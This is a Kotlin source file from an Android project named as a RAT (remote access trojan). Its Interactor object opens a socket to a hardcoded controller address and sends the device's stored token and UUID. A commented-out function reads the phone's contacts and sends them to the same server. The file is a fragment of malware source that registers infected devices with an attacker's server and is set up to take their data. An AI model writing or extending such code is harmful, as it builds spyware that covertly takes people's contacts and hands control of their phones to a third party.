package ru.awawa.rat.server

import android.util.Log
import io.ktor.network.selector.*
import io.ktor.network.sockets.*
import io.ktor.utils.io.*
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.GlobalScope
import kotlinx.coroutines.launch
import kotlinx.coroutines.runBlocking
import ru.awawa.rat.Application
import ru.awawa.rat.helper.ContactsHelper
import ru.awawa.rat.helper.Preferences
import java.io.*
import java.net.InetSocketAddress
import java.net.Socket
import java.net.SocketException
import java.util.logging.Logger

object Interactor {

    private const val TAG = "Interactor"
    private const val SERVER_IP = "10.0.2.2"
    private const val SERVER_PORT = 33455

    private const val dataDivider = ":|:"

    fun init() {
    }

    fun sendToken() {

        GlobalScope.launch(Dispatchers.IO) {

            val socket = Socket()
            socket.connect(InetSocketAddress(SERVER_IP, SERVER_PORT))

            val output = socket.getOutputStream()
            val input = socket.getInputStream().bufferedReader()

            val token = Preferences.get<String>(Preferences.PreferencesField.TOKEN) ?: ""
            val uuid = Preferences.get<String>(Preferences.PreferencesField.UUID) ?: ""

            val dataToSend = "connect:|:$uuid:|:$token\n".toByteArray()
            Log.d(TAG, "Sending $dataToSend")
            output.write(dataToSend)

            Log.d(TAG, "Waiting fo response")
            val result = input.readLine()
            Log.d(TAG, "Received $result")
        }
    }

//    fun sendContacts() {
//        GlobalScope.launch(Dispatchers.IO) {
//            val socket = Socket()
//            socket.connect(InetSocketAddress(SERVER_IP, SERVER_PORT))
//
//            val uuid = Preferences.get<String>(Preferences.PreferencesField.UUID) ?: ""
//            val contacts = ContactsHelper.getContacts(Application.context)
//            socket.getOutputStream().write("contacts:|:$uuid:|:$contacts\n".toByteArray())
//            Log.w(TAG, "Sent: contacts:|:$uuid:|:$contacts")
//
//            val result = socket.getInputStream().bufferedReader().readLine()
//            Log.d(TAG, "Answer: $result")
//
////            if (result[0] != "ok") {
////                val error = result.getOrElse(1) { "" }
////                Log.e(TAG, "Server answered with an error when contacts sent: $error")
////            }
//
//            socket.close()
//        }
//    }
}